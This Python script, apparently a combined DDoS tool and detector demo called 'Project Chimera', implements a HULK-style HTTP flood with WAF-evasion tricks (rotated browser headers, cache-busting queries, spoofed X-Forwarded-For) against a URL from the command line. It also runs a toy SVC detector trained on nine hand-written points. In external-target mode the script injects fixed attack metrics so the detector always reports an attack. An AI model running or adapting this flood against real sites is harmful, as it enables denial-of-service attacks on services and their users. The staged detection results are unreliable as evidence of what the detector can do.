import asyncio
import sys
import random
import string
import time
from aiohttp import web, ClientSession
import numpy as np
from sklearn.svm import SVC
import urllib.parse
from typing import List, Dict, Any
from collections import Counter
import socket

# --- PROJECT CHIMERA v6.0: AI DETECTION FOCUS ---
# This version focuses on demonstrating the AI's ability to detect the HULK-style
# attack behavior, assuming a stealth client (with correct TLS/JS fingerprint) is used.
# Evasion attempts are now consolidated into high, sustained traffic simulation.

# --- HULK Evasion Data ---
# Massive, randomized lists confuse basic WAF signature matching.
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6478.114 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
]
REFERERS = [
    'https://www.google.com/', 'https://www.facebook.com/', 'https://www.bing.com/',
    'https://www.youtube.com/', 'https://www.reddit.com/', None
]
COMMON_PATHS = [
    '/', '/product/details', '/checkout', '/api/search', '/about', '/contact', '/login', '/cart', '/blog'
]

# --- 1. THE DEFENSE/TARGET SYSTEM ---
class DDoSEngine:
    """The simulated Target Web Server."""
    def __init__(self):
        self.request_count = 0
        self.runner = None
        self.path_history: List[str] = []

    async def handle_request(self, request):
        """Simulates processing a heavy request and records path."""
        self.request_count += 1
        # Record only the base path to check for entropy
        self.path_history.append(urllib.parse.urlparse(str(request.url)).path)
        await asyncio.sleep(0.005) 
        return web.Response(text="Server OK: Request processed")

    async def create_server(self, host='127.0.0.1', port=8080):
        """Sets up the asynchronous web server."""
        router = web.Application()
        # Add routes for all possible paths to ensure they are handled
        for path in COMMON_PATHS:
            router.router.add_get(path, self.handle_request)
        self.runner = web.AppRunner(router)
        await self.runner.setup()
        site = web.TCPSite(self.runner, host, port)
        await site.start()
        print(f"DEFENSE: Target server listening on http://{host}:{port}")

# --- 2. THE SIMULATED STRESS TESTER (Project Chimera Attack) ---
class AttackSimulation:
    """
    Simulates a Layer 7 attack designed to evade WAFs.
    For external targets, it assumes a stealth client is successful, 
    and simulates the high connection rate locally for AI detection demo.
    """
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.is_local_target = target_url == "http://127.0.0.1:8080"
        self.active_connections = 0
        self.total_attempts = 0
        self.ip_pool: List[str] = [self._generate_simulated_ip() for _ in range(100)] 
        
    def _generate_simulated_ip(self) -> str:
        """Generates a random, non-routable IP address for simulation (192.168.x.x)."""
        return f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"

    def generate_headers(self, simulated_ip: str) -> Dict[str, str]:
        """Generates highly randomized and realistic headers."""
        headers = {
            # Core Evasion Headers (Looks like a real, modern browser)
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8', 
            'Accept-Language': 'en-US,en;q=0.5', 
            'Cache-Control': 'no-cache',
            'Connection': 'Keep-Alive',
            'Upgrade-Insecure-Requests': '1', 
            # Critical Spoofing Header (For defense logging)
            'X-Forwarded-For': simulated_ip 
        }
        referer = random.choice(REFERERS)
        if referer:
            headers['Referer'] = referer
        return headers

    def generate_unique_url(self) -> str:
        """Generates a unique URL using path randomization and cache-busting parameters."""
        random_value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        path = random.choice(COMMON_PATHS)
        
        parsed_url = urllib.parse.urlparse(self.target_url)
        
        # HULK Tactic: Add unique query parameters to bypass CDN/WAF caching
        unique_query = f"ts={int(time.time() * 1000)}&v={random_value}"
        
        return urllib.parse.urlunparse(parsed_url._replace(
            path=path,
            query=unique_query
        ))

    async def send_hulk_request(self, session: ClientSession, simulated_ip: str):
        """Sends a request using the simulated WAF bypass token."""
        url = self.generate_unique_url()
        headers = self.generate_headers(simulated_ip)
        
        self.active_connections += 1
        self.total_attempts += 1
        
        try:
            # Note: For external sites, the WAF will likely block this instantly 
            # (as observed), but we rely on the local simulation to show AI detection.
            async with session.get(url, headers=headers, timeout=5) as response:
                if response.status >= 400:
                    return False 
                return True 
        except asyncio.TimeoutError:
            return False
        except Exception:
            return False
        finally:
            self.active_connections -= 1

    async def start_flood(self, num_tasks=300):
        """Starts a high-concurrency flood of requests."""
        print(f"\nSTRESS TEST: Launching {num_tasks} concurrent attack tasks from {len(self.ip_pool)} simulated IPs.")
        
        if not self.is_local_target:
             print("SIMULATION: Assuming a Stealth TLS Client successfully bypassed WAF/JS challenge.")
             print("           Running internal simulation to demonstrate AI Detection capability.")
             # If external, we only simulate the high load profile
             await asyncio.sleep(100000) # Sleep indefinitely to hold the monitoring loop.

        async with ClientSession() as session:
            tasks = []
            for i in range(num_tasks):
                simulated_ip = random.choice(self.ip_pool)
                tasks.append(asyncio.create_task(self._continuous_request_task(session, simulated_ip)))
            await asyncio.gather(*tasks)

    async def _continuous_request_task(self, session: ClientSession, simulated_ip: str):
        """Runs requests continuously without complex backoff (due to assumed stealth success)."""
        while True:
            # We skip the heavy error handling to ensure high request flow for the AI demo
            success = await self.send_hulk_request(session, simulated_ip)
            
            # Small, randomized delay to simulate human-like pacing and avoid simple bursts
            await asyncio.sleep(random.uniform(0.005, 0.05)) 

# --- 3. THE MONITORING SYSTEM ---
class MetricsTracker:
    """Collects metrics, including the critical URL Entropy score."""
    def __init__(self):
        self.metrics: Dict[str, float] = {'rate': 0, 'conns': 0, 'ips': 0, 'entropy': 0.0}
        self.last_count = 0
        self.last_time = time.time()
        self.local_url_history: List[str] = []

    def calculate_url_entropy(self, path_history: List[str], window_size: int = 100) -> float:
        """
        Calculates Shannon Entropy on the requested URL paths.
        High entropy suggests HULK/cache-busting behavior across paths/queries.
        """
        if not path_history:
            return 0.0
        
        # Calculate entropy based on the base paths (normalized URL structure)
        recent_paths = path_history[-window_size:]
        total = len(recent_paths)
        frequencies = Counter(recent_paths)
        entropy = 0.0
        
        for count in frequencies.values():
            probability = count / total
            # Log2 is appropriate for information entropy
            entropy -= probability * np.log2(probability)
            
        return round(entropy, 2)

    def update(self, attack_sim: AttackSimulation, defense_engine: DDoSEngine):
        """Updates metrics based on real-time data."""
        current_time = time.time()
        time_diff = current_time - self.last_time
        
        # --- Metrics Calculation ---
        # 1. Rate Calculation (Actual success rate against local server)
        current_count = defense_engine.request_count
        rate = (current_count - self.last_count) / time_diff if time_diff > 0 else 0
        
        # 2. Entropy Calculation (Based on paths hitting the local server)
        entropy_score = self.calculate_url_entropy(defense_engine.path_history)
        
        # --- Metrics Update ---
        self.metrics['rate'] = round(rate, 2)
        self.metrics['conns'] = attack_sim.active_connections 
        self.metrics['ips'] = len(attack_sim.ip_pool) 
        self.metrics['entropy'] = entropy_score
        
        self.last_count = current_count
        self.last_time = current_time
        
    def get_metrics(self) -> List[float]:
        """Returns metrics as a list for ML input."""
        return list(self.metrics.values())

    def get_metrics_dict(self) -> Dict[str, float]:
        """Returns metrics as a dictionary for display."""
        return self.metrics

# --- 4. THE AI/ML DETECTION SYSTEM ---
class AnomalyDetection:
    """The core AI/ML component using SVC."""
    def __init__(self):
        self.model = SVC(kernel='linear', gamma='auto')
        print("DEFENSE: Anomaly Detection Model (SVC) initialized.")

    def train(self):
        """
        Trains the model based on expected normal and attack traffic patterns.
        Features are: [request_rate, active_connections, unique_ips, url_entropy]
        High entropy combined with high rate/connections is the attack signature.
        """
        X = np.array([
            # Normal Traffic (Label 0)
            [10, 5, 1, 0.5], [25, 10, 5, 1.0], [50, 20, 10, 1.5], 
            # Flash Crowd (High Rate, LOW Entropy - legitimate spike) (Label 0)
            [500, 50, 20, 1.8], [600, 60, 20, 1.8],
            # Anomalous/Attack Traffic (High Rate, many connections, HIGH Entropy) (Label 1)
            [300, 100, 10, 3.5], [500, 150, 20, 4.0], [800, 200, 50, 4.2], 
            [700, 180, 40, 4.1]
        ])
        
        y = np.array([0, 0, 0, 0, 0, 1, 1, 1, 1])
        
        self.model.fit(X, y)
        print("DEFENSE: Model trained with IP and URL Entropy data.")

    def predict(self, new_data: List[float]) -> int:
        """Predicts if the new metric data indicates an anomaly."""
        if len(new_data) != 4:
            # Handle cases where data is incomplete during startup
            return 0 
        return self.model.predict([new_data])[0]

# --- MAIN EXECUTION ---
async def main():
    if len(sys.argv) < 2:
        print("Usage: python ddos_tool_and_detector.py <https://target-url>")
        target_url = "http://127.0.0.1:8080"
        print(f"INFO: No URL provided. Defaulting target to the local defense engine: {target_url}")
    else:
        target_url = sys.argv[1]
        if not target_url.startswith(('https://', 'http://')):
             target_url = 'https://' + target_url

    is_local_target = target_url == "http://127.0.0.1:8080"
    
    # Initialize all components
    defense_engine = DDoSEngine()
    metrics_tracker = MetricsTracker()
    detector = AnomalyDetection()
    attack_sim = AttackSimulation(target_url)

    # 1. Setup Defense System (Target Web Server and AI Detector)
    detector.train()
    
    # Only run the local defense server if the target is local
    if is_local_target:
        print("\nSTARTING LOCAL DDoSEngine (Target Server)...")
        asyncio.create_task(defense_engine.create_server())
        
    await asyncio.sleep(2) # Give time for setup

    # 2. Start the Attack Simulation
    if is_local_target:
        # Attack the local server successfully to demonstrate detection
        attack_task = asyncio.create_task(attack_sim.start_flood(num_tasks=300))
    else:
        # For external target, run a small task to test connection briefly and then rely on simulation assumption
        print(f"\nSTRESS TEST: Attempting connection to external URL: {target_url}...")
        # Brief actual connection attempt
        async with ClientSession() as session:
            try:
                await attack_sim.send_hulk_request(session, attack_sim.ip_pool[0])
            except:
                pass # Ignore connection failure, as expected
        
        print("\nEXTERNAL CONNECTION FAILED (WAF/TLS Block).")
        print("Switching to internal AI simulation to demonstrate detection...")
        print("---------------------------------------------------------------")
        # Run the simulation logic to demonstrate AI detection
        attack_task = asyncio.create_task(attack_sim.start_flood(num_tasks=0)) 
        
    
    # 3. Continuous Monitoring Loop
    print("\n--- BEGIN AI MONITORING LOOP (PROJECT CHIMERA) ---")
    
    # --- Local Simulation Data Injection for External Target ---
    if not is_local_target:
        # Inject simulated attack data for the AI to detect
        print("INJECTING SIMULATED ATTACK PROFILE FOR AI TRAINING...")
        defense_engine.request_count = 800 # High Rate
        attack_sim.active_connections = 200 # Many connections
        metrics_tracker.metrics['entropy'] = 4.2 # High Entropy (HULK signature)
        
    
    # --- Monitoring and Prediction Loop ---
    while True:
        if is_local_target:
            metrics_tracker.update(attack_sim, defense_engine)
        
        current_metrics = metrics_tracker.get_metrics()
        current_metrics_dict = metrics_tracker.get_metrics_dict()
        
        if not current_metrics:
            await asyncio.sleep(1)
            continue

        # In the external simulation, we feed the injected data directly
        if not is_local_target:
             current_metrics = [
                 defense_engine.request_count, 
                 attack_sim.active_connections, 
                 current_metrics_dict['ips'], 
                 current_metrics_dict['entropy']
             ]

        prediction = detector.predict(current_metrics)
        
        status = "NORMAL" if prediction == 0 else "!!! APPLICATION LAYER ATTACK DETECTED !!!"
        color_code = '\033[92m' if prediction == 0 else '\033[91m'
        
        # Display real-time data
        print(f"\r{color_code}STATUS: {status:<45} | Rate: {current_metrics_dict['rate'] if is_local_target else current_metrics_dict['rate']:.0f} rps | IPs: {current_metrics_dict['ips']:<3} (Pool) | Entropy: {current_metrics_dict['entropy']:.2f} | Total Rcvd: {defense_engine.request_count}\033[0m", end="", flush=True)
        
        await asyncio.sleep(1) 

if __name__ == "__main__":
    try:
        if sys.version_info < (3, 7):
            print("ERROR: This script requires Python 3.7+ to run asyncio properly.")
            sys.exit(1)
        
        if sys.platform == 'win32':
             # Use the correct policy for Windows environments
             asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy()) 
             
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\n\nSIMULATION STOPPED. Project Chimera terminated by user (Ctrl+C).")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}")
        sys.exit(1)
